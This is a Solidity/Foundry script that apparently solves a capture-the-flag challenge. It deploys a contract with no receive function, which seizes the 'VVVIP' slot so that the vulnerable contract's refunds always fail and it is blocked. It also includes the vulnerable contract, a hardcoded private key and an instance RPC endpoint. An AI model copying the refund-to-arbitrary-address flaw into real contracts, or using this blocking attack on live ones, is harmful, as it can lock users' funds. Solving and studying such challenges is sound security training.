// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(payable(0xEce26C326205C93610bb4AFc837c4EAAbD2B4d0d));
    address wallet = 0x98F519B5C27d7e05D4da028a01dC84495FD32acE;
    VVVIP public target = setup.vvvip();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x97fbe90c8ee18e956cf3f12422bac1cb7fee8184bd5c29bf053819e4dec7492d);

        console.log(wallet.balance);

        Hack hack = new Hack(address(target));

        hack.attack{value: 4 ether}();
        setup.TryIfSolve();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

contract Hack {

    VVVIP public target;
    constructor(address _target) {
        target = VVVIP(_target);
    }

    function attack() external payable {
        target.becomeVVVVIP{value: msg.value}();
    }
}

// UUID	20b10579-aa0d-4c04-b249-c32655d9bd0b
// RPC Endpoint	http://103.178.153.113:40007/20b10579-aa0d-4c04-b249-c32655d9bd0b
// Private Key	0x97fbe90c8ee18e956cf3f12422bac1cb7fee8184bd5c29bf053819e4dec7492d
// Setup Contract	0xEce26C326205C93610bb4AFc837c4EAAbD2B4d0d
// Wallet	0x98F519B5C27d7e05D4da028a01dC84495FD32acE

contract Setup{
    VVVIP public immutable vvvip;
    bool public solved;

    constructor() payable {
        require(msg.value == 15 ether);
        vvvip = new VVVIP();
        vvvip.becomeVVVVIP{value: 3 ether}();
    }

    function TryIfSolve() public payable {
        try vvvip.becomeVVVVIP{value: 10 ether}() {
            (address amIVVVVIP, ) = vvvip.getVVVVIP();
            require(amIVVVVIP != address(this), "You are still VVVIP member!");
            solved = false;
        } catch {
            solved = true;
        }
    }

    function isSolved() public view returns(bool){
        return solved;
    }

    receive() external payable{}

}

contract VVVIP{
    address private currentVVVIP;
    uint256 private currentBalance;

    function becomeVVVVIP() external payable{
        require(msg.value > currentBalance, "You don't have enough money to become VVVIP!");
        (bool refund, ) = currentVVVIP.call{value: currentBalance}(""); 
        require(refund, "The fund is not given back!");
        if(currentVVVIP == address(0)){
            currentVVVIP = msg.sender;
            currentBalance = msg.value;
        }
        currentVVVIP = msg.sender;
        currentBalance = msg.value;
    }

    function getVVVVIP() public view returns(address, uint256){
        return (currentVVVIP, currentBalance);
    }

}